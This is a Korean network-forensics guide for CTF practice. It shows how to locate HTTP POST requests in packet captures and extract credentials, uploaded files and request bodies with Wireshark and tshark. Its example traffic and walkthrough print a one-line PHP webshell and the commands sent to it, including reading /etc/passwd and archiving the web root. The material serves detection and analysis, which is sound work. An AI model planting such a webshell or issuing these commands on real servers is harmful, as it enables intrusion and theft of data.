---
id: FOR-0158
title: "pcap에서 HTTP POST 찾아 본문·자격증명·업로드 파일 뽑기"
slug: "http-post-find"
category: "Network/PCAP"
type: "guide"
difficulty: "intermediate"
priority: "critical"
platform: [windows, linux]
artifact: ["pcap", "pcapng", "HTTP request body"]
file_paths: []
registry_paths: []
event_ids: []
protocols: ["HTTP", "TCP"]
tools: ["Wireshark", "tshark", "CyberChef 대체(Base64encoder)", "HxD"]
commands: ["tshark -r c.pcapng -Y 'http.request.method == \"POST\"' -T fields -e frame.number -e http.host -e http.request.uri", "tshark -r c.pcapng -Y 'urlencoded-form' -T fields -e urlencoded-form.key -e urlencoded-form.value", "tshark -r c.pcapng -Y 'http.request.method == \"POST\"' -T fields -e http.file_data"]
regex_patterns: ["(?i)(user(name)?|pass(word)?|pw|login|token|session)=([^&\\s]+)", "(?i)Authorization:\\s*Basic\\s+([A-Za-z0-9+/=]+)"]
wireshark_filters: ["http.request.method == \"POST\"", "urlencoded-form", "http.file_data", "http.content_type contains \"multipart\"", "mime_multipart", "json", "http.request.uri contains \"login\"", "http.file_data contains \"password\"", "tcp.stream eq 7", "http.response.code == 200"]
tshark_fields: ["http.request.method", "http.request.uri", "http.host", "http.file_data", "urlencoded-form.key", "urlencoded-form.value", "http.content_length", "http.content_type", "http.authorization"]
log_fields: []
file_formats: ["pcap", "pcapng"]
keywords: ["HTTP POST", "POST 찾기", "urlencoded-form", "http.file_data", "업로드", "자격증명", "credential", "로그인 패킷", "multipart", "form data"]
aliases: ["http post 찾기", "post 요청 찾기", "패킷에서 비밀번호", "로그인 정보 찾기", "업로드 파일 찾기", "post 본문 보기", "폼 데이터"]
symptom_keywords: ["POST 본문이 안 보인다", "비밀번호를 찾아야 한다", "업로드한 파일을 찾고 싶다", "로그인 흔적", "form 데이터가 필요하다", "http.file_data가 비어있다", "Export Objects에 없다"]
related: ["FOR-0146", "FOR-0128"]
source_ids: ["SRC-002", "SRC-003", "SRC-010"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

`http.request.method == "POST"`로 요청을 찾고, 본문은 **`urlencoded-form`(폼) / `mime_multipart`(파일 업로드) / `json`(API)** 중 어느 형태인지 `http.content_type`으로 판정한 뒤 `http.file_data` 또는 Follow HTTP Stream으로 꺼낸다.

## 어떤 문제에서 필요한가

- "전송된 아이디와 비밀번호를 찾아라"
- "업로드된 파일 이름과 내용을 구하라"
- "웹셸에 어떤 명령을 보냈는가"
- "탈취된 데이터가 어디로 나갔는가"
- "API 호출의 요청 본문을 복원하라"

GET은 URI에 정보가 그대로 보이지만, **POST는 본문에 숨어 있어 한 단계를 더 거쳐야 한다.** 그 한 단계가 이 글의 내용이다.

## 문제에서 처음 볼 단서

1. Protocol Hierarchy에 HTTP가 있고 `Line-based text data` 또는 `Media Type`이 함께 보인다 ([FOR-0146](./wireshark-30sec-triage.html))
2. 지문에 "로그인", "업로드", "전송", "제출", "입력" 같은 표현
3. `Info` 컬럼에 `POST /login HTTP/1.1`처럼 URI가 보인다
4. Conversations에서 클라이언트→서버 방향 바이트가 비정상적으로 크다 = 업로드

## 30초 절차

Wireshark 필터 입력창에:

```text
http.request.method == "POST"
```

결과가 나오면 해당 패킷 우클릭 → `Follow > HTTP Stream`. 요청 헤더와 본문이 한 화면에 나온다.

자격증명만 급하게 찾으려면:

```text
http.file_data contains "password" || urlencoded-form.key contains "pass"
```

CLI 한 줄:

```bash
tshark -r capture.pcapng -Y 'http.request.method == "POST"' \
  -T fields -e frame.number -e ip.src -e http.host -e http.request.uri -e http.content_type -E header=y
```

## 상세 절차

### 1단계 — POST 목록을 표로 확보

```bash
tshark -r capture.pcapng -Y 'http.request.method == "POST"' \
  -T fields -e frame.number -e tcp.stream -e ip.src -e http.host \
            -e http.request.uri -e http.content_type -e http.content_length \
  -E header=y -E separator=,
```

```text
frame.number,tcp.stream,ip.src,http.host,http.request.uri,http.content_type,http.content_length
842,7,10.0.0.15,shop.example.com,/login,application/x-www-form-urlencoded,47
1204,11,10.0.0.15,shop.example.com,/admin/upload.php,multipart/form-data; boundary=----WebKitFormBoundaryX1,8421
3390,19,10.0.0.15,api.example.com,/v1/sync,application/json,1204
```

**`http.content_type`이 다음 행동을 결정한다.** 이 표 하나로 어떤 POST가 로그인이고 어떤 것이 업로드인지 즉시 갈린다.

### 2단계 — Content-Type별로 본문 꺼내는 법이 다르다

| Content-Type | Wireshark 필터 | 본문 꺼내는 방법 |
| --- | --- | --- |
| `application/x-www-form-urlencoded` | `urlencoded-form` | 패킷 상세에서 `HTML Form URL Encoded` 트리 전개 — **키/값이 파싱되어 나온다** |
| `multipart/form-data` | `mime_multipart` | `MIME Multipart Media Encapsulation` 트리에서 파일명·파일 내용 확인 |
| `application/json` | `json` | `JavaScript Object Notation` 트리 전개 |
| `text/plain`, 기타 | `http.file_data` | Follow HTTP Stream 또는 `http.file_data` 바이�� |
| 압축/암호화 | `http.file_data` | Follow Stream → `Raw` 저장 후 별도 처리 |

### 3단계 — 폼 로그인: `urlencoded-form`

가장 흔한 CTF 패턴이다.

```text
urlencoded-form
```

패킷 상세 트리:

```text
▼ HTML Form URL Encoded: application/x-www-form-urlencoded
  ▼ Form item: "username" = "admin"
      Key: username
      Value: admin
  ▼ Form item: "password" = "Sup3r$ecret!"
      Key: password
      Value: Sup3r$ecret!
  ▼ Form item: "csrf_token" = "a91f..."
```

CLI로 전부 뽑기:

```bash
# 모든 폼 항목을 키=값으로
tshark -r capture.pcapng -Y 'urlencoded-form' \
  -T fields -e frame.number -e http.host -e http.request.uri \
            -e urlencoded-form.key -e urlencoded-form.value -E header=y

# 자격증명처럼 보이는 키만
tshark -r capture.pcapng -Y 'urlencoded-form' \
  -T fields -e urlencoded-form.key -e urlencoded-form.value |
  grep -Ei '(user|pass|pw|login|token|session|email)'
```

**URL 디코딩을 잊지 않는다.** `Sup3r%24ecret%21` 처럼 퍼센트 인코딩된 값이 그대로 나온다.

```bash
# Python으로 디코딩
python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" 'Sup3r%24ecret%21'
```

```powershell
# PowerShell
[System.Uri]::UnescapeDataString('Sup3r%24ecret%21')
```

### 4단계 — 파일 업로드: `multipart/form-data`

```text
http.content_type contains "multipart"
```

패킷 상세:

```text
▼ MIME Multipart Media Encapsulation, Type: multipart/form-data, Boundary: "----WebKitFormBoundaryX1"
  ▼ Encapsulated multipart part: (application/octet-stream)
      Content-Disposition: form-data; name="file"; filename="av4tar.php"
      Content-Type: application/octet-stream
    ▼ Data (8214 bytes)
```

- `filename="..."` 이 **업로드된 파일 이름** = 대개 문제의 정답
- `Data` 노드를 우클릭 → `Export Packet Bytes...` → 파일로 저장하면 **업로드된 파일 원본**을 얻는다

```bash
# 업로드 파일명만 전부
tshark -r capture.pcapng -Y 'mime_multipart' \
  -T fields -e frame.number -e mime_multipart.header.content-disposition

# 본문 전체를 hex로 받아 파일로 복원
tshark -r capture.pcapng -Y 'frame.number == 1204' -T fields -e http.file_data |
  tr -d ':\n' | xxd -r -p > uploaded.bin
file uploaded.bin
```

### 5단계 — API: `application/json`

```text
json
```

```bash
tshark -r capture.pcapng -Y 'http.request.method == "POST" && json' \
  -T fields -e http.request.uri -e json.key -e json.value.string

# 본문 원문 그대로
tshark -r capture.pcapng -Y 'http.request.method == "POST" && http.content_type contains "json"' \
  -T fields -e http.file_data | tr -d ':\n' | xxd -r -p | python3 -m json.tool
```

### 6단계 — Follow HTTP Stream: 가장 확실한 방법

필터가 안 먹거나 파서가 인식하지 못할 때, 그리고 **요청과 응답을 함께 봐야 할 때**는 이것이 정답이다.

패킷 우클릭 → `Follow > HTTP Stream`

```text
POST /admin/upload.php HTTP/1.1
Host: shop.example.com
Content-Length: 8421
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX1
Cookie: PHPSESSID=9f2a...
Authorization: Basic YWRtaW46UzNjcjN0UGFzcw==

------WebKitFormBoundaryX1
Content-Disposition: form-data; name="file"; filename="av4tar.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryX1--

HTTP/1.1 200 OK
Content-Type: text/html

{"status":"ok","path":"/uploads/av4tar.php"}
```

한 화면에서 **자격증명(`Authorization: Basic`), 세션 쿠키, 업로드 파일명, 파일 내용, 서버 응답 경로**가 모두 나온다. 응답의 `200 OK`와 `path`가 업로드 성공을 확정한다.

`Authorization: Basic`은 Base64다.

```bash
echo 'YWRtaW46UzNjcjN0UGFzcw==' | base64 -d
# admin:S3cr3tPass
```

```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRtaW46UzNjcjN0UGFzcw=='))
```

## 출력 필드 해석

| 필드 | 의미 | 주의점 |
| --- | --- | --- |
| `http.request.method` | `POST`/`GET`/`PUT` | 문자열 비교이므로 **따옴표와 대문자** 필수 |
| `http.request.uri` | 경로 + 쿼리 | 호스트는 포함되지 않는다 |
| `http.request.full_uri` | `http://host/path?query` 전체 | Host 헤더와 합성된 값 |
| `http.host` | Host 헤더 | 가상 호스트 구분 |
| `http.content_type` | 본문 형식 | **다음 행동을 결정하는 필드** |
| `http.content_length` | 선언된 본문 길이 | 실제 전송량과 다를 수 있다(청크 전송) |
| `http.file_data` | **재조립된 본문 바이트** | 여러 패킷에 걸친 본문이 합쳐진 값 |
| `urlencoded-form.key` / `.value` | 파싱된 폼 항목 | 퍼센트 인코딩 그대로 |
| `mime_multipart.header.content-disposition` | `filename="..."` 포함 | 업로드 파일명의 출처 |
| `http.authorization` | Authorization 헤더 | `Basic`은 Base64, `Bearer`는 JWT |
| `http.cookie` | 요청 쿠키 | 세션 하이재킹 문제의 답 |
| `http.response.code` | 응답 코드 | **본문과 짝지어 성공 판정** |
| `http.time` | 요청→응답 소요 시간 | 대용량 업로드 식별 |
| `tcp.stream` | 스트림 번호 | Follow Stream으로 가는 열쇠 |

`http.file_data`는 **재조립된 값**이라는 점이 중요하다. 본문이 여러 TCP 세그먼트로 나뉘어도 마지막 패킷에 전체가 붙는다. 따라서 `http.file_data contains "password"`는 세그먼트 경계를 넘어서도 동작한다.

## pivot: 다음에 볼 artifact

| POST에서 얻은 것 | 다음 목표 | 확인할 것 |
| --- | --- | --- |
| 계정/비밀번호 | EVTX 4624/4625 ([FOR-0083](./event-4624-logon.html)) | 실제 로그온 성공 여부 |
| 업로드 파일명 | `http.request.uri contains "<파일명>"` | **업로드 후 실행했는가** (GET 요청) |
| 업로드 파일명 | `$MFT` ([FOR-0021](./mft-basics.html)) | 디스크에 실제 생성된 시각 |
| 세션 쿠키 | 같은 쿠키를 쓴 다른 요청 전부 | 세션 재사용/탈취 |
| 응답의 경로 | 웹 서버 `access.log` ([FOR-0121](./powershell-select-string.html)) | 서버 측 기록과 대조 |
| 공격자 IP | `ip.addr == <IP>`로 전체 활동 ([FOR-0128](./ipv4-regex.html)) | 스��→침입→유출 흐름 |
| 대용량 POST | Conversations의 바이트 크기 | 데이터 유출량 |
| 명령 문자열 | EVTX 4688, PowerShell 4104 | 서버에서의 실제 실행 |

**업로드 다음에 실행이 온다.** POST로 파일을 올린 뒤 GET으로 그 파일을 호출하는 2단 구조가 웹셸의 표준 패턴이다.

```text
http.request.uri contains "av4tar"
```

이 필터 하나로 업로드와 이후 모든 명령 실행이 한 화면에 나온다.

## 흔한 함정

- **`http.request.method == POST` (따옴표 없음).** Wireshark는 문자열 비교에 따옴표를 요구한다. `"POST"`로 써야 하고 **대문자**여야 한다.
- **`http.file_data`가 비어 있다고 본문이 없다고 판단하는 것.** 원인은 셋 중 하나다. ① TCP 재조립이 꺼져 있음(`Preferences > Protocols > TCP > Allow subdissector to reassemble TCP streams` 활성화) ② 청크 전송 ③ 비표준 포트로 HTTP가 인식되지 않음(`Decode As > HTTP`).
- **Export Objects에 POST 본문이 없다고 생각하는 것.** 버전에 따라 요청 엔티티가 목록에 나오지 않는다. Follow HTTP Stream이 확실하다.
- **URL 디코딩을 건너뛰는 것.** `flag%7B...%7D`는 `flag{...}`다. `%20`(공백), `%2B`(+), `%3D`(=)를 놓치면 답이 틀린다.
- **`+`를 공백으로 되돌리지 않는 것.** `x-www-form-urlencoded`에서 `+`는 **공백**이다. `unquote_plus`를 써야 한다.
- **HTTPS를 POST로 찾으려는 것.** TLS 안의 HTTP는 `http` 필터에 안 걸린다. 키가 있으면 `Preferences > Protocols > TLS > (Pre)-Master-Secret log filename`에 SSLKEYLOGFILE을 지정해 복호화한다. 없으면 SNI/크기 패턴으로 우회.
- **재전송된 POST를 두 번 세는 것.** `Analyze > Expert Information`에서 재전송을 확인한다. 같은 자격증명이 2회 보이는 것은 재전송일 수 있다.
- **응답을 안 보는 것.** `200`인지 `401`/`403`인지가 성공/실패를 가른다. 실패한 로그인 시도를 정답으로 제출하는 실수가 흔하다.
- **`urlencoded-form`이 안 걸리는 경우.** `Content-Type`이 없거나 잘못 설정된 요청은 파싱되지 않는다. `http.file_data`로 직접 본다.
- **multipart 본문을 텍스트로 저장하는 것.** 바이너리 파일이 업로드된 경우 반드시 `Export Packet Bytes`로 저장한다. 복사-붙여넣기는 바이트를 망친다.

## 교차검증

```bash
# 1) POST 개수
tshark -r capture.pcapng -Y 'http.request.method == "POST"' | wc -l

# 2) 폼 항목 파싱 결과
tshark -r capture.pcapng -Y 'urlencoded-form' \
  -T fields -e urlencoded-form.key -e urlencoded-form.value

# 3) 파서를 우회한 원문 확인 — 2)가 놓친 것이 있는지
tshark -r capture.pcapng -Y 'http.request.method == "POST"' \
  -T fields -e http.file_data | tr -d ':\n' | xxd -r -p | strings | grep -Ei 'pass|user'

# 4) 최후 수단 — 파일 전체 문자열
strings capture.pcapng | grep -Ei '^(user|pass|login)?[a-z_]*=(.{3,})' | head -20

# 5) 서버 측 로그와 대조 (있다면)
grep -E '"POST /(login|admin/upload)' access.log
```

2)와 3)의 결과 개수가 다르면 파서가 일부 요청을 인식하지 못한 것이다. 이 경우 3)을 신뢰한다.

## mini walkthrough

```text
문제:
"공격자가 업로드한 웹셸 파일 이름과 마지막으로 실행한 명령을 구하세요."
첨부: web_attack.pcapng (6,204 packets)

1. POST 목록
   tshark -r web_attack.pcapng -Y 'http.request.method == "POST"' \
     -T fields -e frame.number -e http.request.uri -e http.content_type -E header=y

   frame  uri                  content_type
   1102   /login               application/x-www-form-urlencoded
   1188   /login               application/x-www-form-urlencoded
   1240   /login               application/x-www-form-urlencoded
   2015   /admin/upload.php    multipart/form-data; boundary=----X1

2. 로그인 시도 3건 — 어느 것이 성공?
   필터: urlencoded-form
   frame 1102: username=admin  password=admin
   frame 1188: username=admin  password=password123
   frame 1240: username=admin  password=Adm1n%40shop2026

   응답 확인 (같은 스트림의 응답 코드)
   tshark -r web_attack.pcapng -Y 'http.response' \
     -T fields -e frame.number -e tcp.stream -e http.response.code

   -> 1240의 스트림만 302 (리다이렉트 = 로그인 성공), 앞의 둘은 200 (재표시 = 실패)

   URL 디코딩: Adm1n%40shop2026 -> Adm1n@shop2026

3. 업로드 확인
   필터: mime_multipart
   frame 2015:
     Content-Disposition: form-data; name="file"; filename="av4tar.php"
     Data (218 bytes)

   우클릭 Data > Export Packet Bytes > shell.php
   $ cat shell.php
   <?php if(isset($_GET['cmd'])) system($_GET['cmd']); ?>

4. 첫 시도 (실패):
   File > Export Objects > HTTP 에서 av4tar.php를 찾았지만 목록에 없었다.
   POST 요청 엔티티가 목록에 나오지 않는 버전이었다.
   -> Export Packet Bytes로 우회 (3단계).

5. 실행된 명령 — 업로드 이후의 GET
   필터: http.request.uri contains "av4tar"

   frame  uri
   2015   /admin/upload.php            (업로드, POST)
   2211   /uploads/av4tar.php?cmd=id
   2260   /uploads/av4tar.php?cmd=whoami
   2318   /uploads/av4tar.php?cmd=cat%20/etc/passwd
   2455   /uploads/av4tar.php?cmd=tar%20-czf%20/tmp/d.tgz%20/var/www/html

   마지막: cmd=tar -czf /tmp/d.tgz /var/www/html   (URL 디코딩 후)

6. 교차검증 — 응답 크기로 성공 확인
   필터: tcp.stream eq <2455의 스트림> && http.response
   -> 200 OK, 본문 0바이트 (tar은 출력이 없다) = 정상 실행

정답: av4tar.php / tar -czf /tmp/d.tgz /var/www/html
```

2단계의 **응답 코드로 성공/실패를 가른 것**과 4단계의 **Export Objects 실패를 Export Packet Bytes로 우회한 것**이 이 문제의 핵심이었다.

## 막혔을 때 다음 체크

1. `http.request.method == "POST"` 에 **따옴표와 대문자**를 썼는가
2. `http.content_type`을 확인해 본문 형태를 판정했는가
3. `urlencoded-form` / `mime_multipart` / `json` 중 맞는 필터를 썼는가
4. Follow HTTP Stream을 시도했는가 — 필터보다 항상 확실하다
5. URL 디코딩(`%XX`)과 `+`→공백 변환을 했는가
6. `Authorization: Basic`을 Base64 디코딩했는가
7. **응답 코드**를 확인했는가 — 성공/실패 판정
8. `http.file_data`가 비었다면 TCP 재조립 설정과 `Decode As`를 확인했는가
9. 비표준 포트인가 → `Decode As > HTTP`
10. TLS인가 → SNI/인증서/크기 패턴으로 전환
11. 업로드 파일명으로 **이후 GET 요청**을 검색했는가 — 실행 흔적은 거기 있다
12. `strings capture.pcapng | grep -Ei 'pass|flag'` 를 최후 수단으로 돌렸는가

## 출처

- SRC-002 — Wireshark Display Filter Reference: `http.*`, `urlencoded-form.*`, `mime_multipart.*` 필드 정의
- SRC-003 — Wireshark User's Guide: Follow HTTP Stream, Export Packet Bytes, TCP 재조립 설정
- SRC-010 — tshark man page: `-Y`, `-T fields`, `-E header=y`
